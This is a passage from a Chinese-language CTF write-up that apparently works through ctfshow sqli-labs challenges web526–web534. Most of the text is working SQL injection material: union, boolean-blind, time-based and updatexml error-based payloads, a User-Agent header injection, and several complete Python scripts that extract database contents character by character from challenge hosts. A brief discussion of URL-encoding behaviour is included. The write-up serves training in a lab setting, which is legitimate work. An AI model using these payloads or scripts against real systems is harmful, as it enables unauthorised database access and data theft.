information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)--+&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1\&quot; and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)--+&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=1\&quot; and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flagugs&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)--+&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1\&quot; and if(ascii(substr((select flag43s from ctfshow.flagugs),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)--+&quot;</span></span><br><span class="line"></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        end = time.time() - start</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="number">1.5</span> :</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span> :</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web527"><a href="#web527" class="headerlink" title="web527"></a>web527</h2><h3 id="POST字符型union"><a href="#POST字符型union" class="headerlink" title="#POST字符型union"></a>#POST字符型union</h3><p>这次的话是post传参，先测一下注入点，发现两个都可以注入</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=1&#x27;or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span>--+&amp;<span class="attribute">submit</span>=Submit&amp;uname=1</span><br></pre></td></tr></table></figure>

<p>然后正常联合注入就行了</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passwd=<span class="number">1</span>&amp;submit=Submit&amp;uname=<span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">schema_name</span>)<span class="keyword">from</span> information_schema.schemata)--+</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">passwd</span>=<span class="number">1</span>&amp;submit=Submit&amp;uname=<span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=<span class="string">&#x27;ctfshow&#x27;</span>)--+</span><br><span class="line"></span><br><span class="line">passwd=<span class="number">1</span>&amp;submit=Submit&amp;uname=<span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&#x27;flagugsd&#x27;</span>)--+</span><br><span class="line"></span><br><span class="line">passwd=<span class="number">1</span>&amp;submit=Submit&amp;uname=<span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> flag43s <span class="keyword">from</span> ctfshow.flagugsd)--+</span><br></pre></td></tr></table></figure>

<h2 id="web528"><a href="#web528" class="headerlink" title="web528"></a>web528</h2><h3 id="POST双引号括号union"><a href="#POST双引号括号union" class="headerlink" title="#POST双引号括号union"></a>#POST双引号括号union</h3><p>这次是双引号括号闭合的，也是一样直接打就行</p>
<h2 id="web529"><a href="#web529" class="headerlink" title="web529"></a>web529</h2><h3 id="POST单引号括号盲注"><a href="#POST单引号括号盲注" class="headerlink" title="#POST单引号括号盲注"></a>#POST单引号括号盲注</h3><p>测出来是单引号括号，但是没回显执行结果</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=<span class="number">1</span>&amp;submit=Submit&amp;uname=<span class="number">1</span>&#x27;) or &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span>&#x27;--+</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sqli-labs/image-20250604130047877.png" alt="image-20250604130047877"></p>
<p>我发现这题可以打盲注也可以打报错注入，貌似前面的题也是可以打报错注入的</p>
<p>报错注入</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=<span class="number">1</span>&amp;submit=Submit&amp;uname=<span class="number">1</span>&#x27;) or (select updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(database()),<span class="number">0</span>x7e),<span class="number">1</span>))--+</span><br></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XPATH</span> syntax <span class="literal">error</span>: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure>

<p>打盲注吧</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=<span class="number">1</span>&amp;submit=Submit&amp;uname=<span class="number">1</span>&#x27;) or if(<span class="number">1</span>&lt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)--+</span><br></pre></td></tr></table></figure>

<p>我发现有一个问题</p>
<h3 id="关于解码问题"><a href="#关于解码问题" class="headerlink" title="#关于解码问题"></a>#关于解码问题</h3><p>如果我们在web页面采用表单提交的话</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=<span class="number">1</span>&#x27;) or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)--+</span><br></pre></td></tr></table></figure>

<p>抓包可以看到</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604142949157.png" alt="image-20250604142949157"></p>
<p>此时空格会被编码为<code>+</code>号，而我们末尾的注释符中的<code>+</code>号不会被编码，然后由于在服务器接收数据后<strong>解析application&#x2F;x-www-form-urlencoded协议</strong>，会先将+替换成空格，然后才会进行url解码操作，此时到达sql服务器的语句就是</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=<span class="number">1</span>&#x27;) or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)--(空格)</span><br></pre></td></tr></table></figure>

<p>然而在requests发送请求的时候，requests库会对特殊字符全部都进行URl编码</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入的</span></span><br><span class="line"><span class="attribute">payload</span> = <span class="string">&quot;1&#x27;) or 1=1 --+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Requests实际发送</span></span><br><span class="line"><span class="attribute">uname</span>=<span class="number">1</span>%<span class="number">27</span>%<span class="number">29</span>%<span class="number">20</span>or%<span class="number">201</span>%<span class="number">3</span>D1%<span class="number">20</span>--%<span class="number">2</span>B</span><br></pre></td></tr></table></figure>

<p>到达服务器的时候服务器解析协议就不会将%2b替换成空格而是作为正常的编码字符并在后面解码为<code>+</code>所以我们如果在POST传参的时候如果期望request库进行编码的话那就传入data参数，如果需要传入原始字符那就使用json参数</p>
<p>然后就会有个新的问题出现</p>
<ul>
<li>为什么之前GET请求的时候用–+就可以呢？</li>
</ul>
<p>第一个就是URL参数和表单数据的解析规则不同</p>
<p>URL参数的解析是先解码再替换，而表单数据的解析是先替换再解码</p>
<p>然后回顾之前我们的request发送请求</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.<span class="built_in">get</span>(url, <span class="attribute">params</span>=params) 与 requests.<span class="built_in">get</span>(url + params)</span><br></pre></td></tr></table></figure>

<p>一个是传参一个是直接拼接，前者会进行url编码后者不会，这也导致了我们利用拼接的时候可以顺利的将+处理为空格</p>
<p>假如我们用编码的方式，那么就不能用+号了</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604142053653.png" alt="image-20250604142053653"></p>
<p>此时无法被作为注释符号，所以我们可以换成–空格的形式</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604142022998.png" alt="image-20250604142022998"></p>
<p>可以看到此时空格被替换成了+号，那就进入服务器的时候+号就会被解码成空格，从而被作为注释符号</p>
<p>结论：</p>
<p>当我们需要用到request库的自动编码功能的时候，我们可以将+号替换成我们的空格</p>
<p>当我们直接对参数进行拼接的时候（或传入原始字符串），我们可以直接使用+号，此时+号不会进行编码</p>
<p>所以我们写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4fea7074-c4fa-414e-8d0e-d9f475c1379b.challenge.ctf.show/&#x27;</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27;) or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27;) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27;) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;) or if(ascii(substr((select flag4 from ctfshow.flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)-- &quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;uname&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag.jpg&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web530"><a href="#web530" class="headerlink" title="web530"></a>web530</h2><h3 id="POST双引号盲注"><a href="#POST双引号盲注" class="headerlink" title="#POST双引号盲注"></a>#POST双引号盲注</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd=<span class="number">1</span>&amp;<span class="keyword">submit=Submit&amp;uname=1&quot; </span><span class="keyword">or </span><span class="string">&quot;1&quot;</span>=<span class="string">&quot;2&quot;</span>--+ 登录失败</span><br><span class="line">passwd=<span class="number">1</span>&amp;<span class="keyword">submit=Submit&amp;uname=1&quot; </span><span class="keyword">or </span><span class="string">&quot;1&quot;</span>=<span class="string">&quot;1&quot;</span>--+ 登录成功</span><br></pre></td></tr></table></figure>

<p>双引号闭合的布尔盲注</p>
<p>提一嘴：未知用户名的情况下最好还是用and，因为这里用户名为1是没有的所以sql语句前面为False，所以只需要关注我们传入的注入语句返回的1或者0就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tensorflow.tools.docs.doc_controls <span class="keyword">import</span> header</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://992e90cf-af1b-44c7-9737-caab7309a448.challenge.ctf.show/&#x27;</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1\&quot; or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1\&quot; or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1\&quot; or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flagb&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1\&quot; or if(ascii(substr((select flag4s from ctfshow.flagb),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)-- &quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag.jpg&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web531"><a href="#web531" class="headerlink" title="web531"></a>web531</h2><h3 id="POST单引号盲注"><a href="#POST单引号盲注" class="headerlink" title="#POST单引号盲注"></a>#POST单引号盲注</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ff847980-6013-41f5-a198-1dbf37103816.challenge.ctf.show/&#x27;</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1\&quot; or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27; or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1&#x27; or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flagba&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; or if(ascii(substr((select flag4sa from ctfshow.flagba),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)-- &quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag.jpg&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web532"><a href="#web532" class="headerlink" title="web532"></a>web532</h2><h3 id="POST双引号括号盲注"><a href="#POST双引号括号盲注" class="headerlink" title="#POST双引号括号盲注"></a>#POST双引号括号盲注</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd=<span class="number">1</span>&amp;<span class="keyword">submit=Submit&amp;uname=1&quot;) </span><span class="keyword">or </span>if(<span class="number">1</span>&lt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)--+ 登录成功</span><br><span class="line">passwd=<span class="number">1</span>&amp;<span class="keyword">submit=Submit&amp;uname=1&quot;) </span><span class="keyword">or </span>if(<span class="number">1</span>&gt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)--+ 登录失败</span><br></pre></td></tr></table></figure>

<p>找到闭合方式了那就写脚本吧</p>
<p>其实一般布尔盲注都是支持时间盲注的，不过能用布尔的话还是用布尔，毕竟布尔还是快一点</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://cbe4fbaf-ccab-42f8-96ec-32870da3c6c6.challenge.ctf.show/&#x27;</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;1\&quot;) or if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1\&quot;) or if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctfshow&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;1\&quot;) or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flagbab&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- &quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;1\&quot;) or if(ascii(substr((select flag4sa from ctfshow.flagbab),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)-- &quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag.jpg&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web533"><a href="#web533" class="headerlink" title="web533"></a>web533</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="#报错注入"></a>#报错注入</h3><p>一个重置密码的页面，但是必须传入一个存在的用户名才有回显好像</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604150659330.png" alt="image-20250604150659330"></p>
<p>注入点在passwd，单引号闭合，但是后面没啥回显，看看能不能打报错注入</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1&#x27;and (<span class="name">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">database</span>()),<span class="number">0</span>x7e),<span class="number">1</span>))--+&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>

<p>有回显，那就打吧</p>
<p>需要用切片函数截取一下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">passwd</span>=<span class="number">1</span>&#x27;and (select updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,left((select flag4 from ctfshow.flag),<span class="number">30</span>),<span class="number">0</span>x7e),<span class="number">1</span>))--+&amp;submit=Submit&amp;uname=admin</span><br><span class="line"></span><br><span class="line"><span class="attribute">passwd</span>=<span class="number">1</span>&#x27;and (select updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,right((select flag4 from ctfshow.flag),<span class="number">30</span>),<span class="number">0</span>x7e),<span class="number">1</span>))--+&amp;submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure>

<h2 id="web534"><a href="#web534" class="headerlink" title="web534"></a>web534</h2><h3 id="UA头单引号报错注入"><a href="#UA头单引号报错注入" class="headerlink" title="#UA头单引号报错注入"></a>#UA头单引号报错注入</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Your</span> IP ADDRESS is: <span class="number">172.12.23.142</span></span><br></pre></td></tr></table></figure>

<p>看到一个ip地址的回显，猜测是请求头的注入</p>
<p>一开始以为是在XFF上的注入，后面弱口令登入后返回了一个UA头信息，才知道是在UA头注入</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250604152356237.png" alt="image-20250604152356237"></p>
<p>UA头注入普遍来说就是登录成功后服务器会记录当前UA头的情况，所以可以看成是一个insert插入或update更新，那我们可以打报错注入</p>
<p>推测后台插入语句</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>所以插入语句</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User</span>-Agent: &#x27; and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(version()),<span class="number">0</span>x7e),<span class="number">1</span>) and &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sqli-labs/image-20250604153215767.png" alt="image-20250604153215767"></p>
<p>成功注入并产生报错</p>
<p>那我们继续打就行</p>
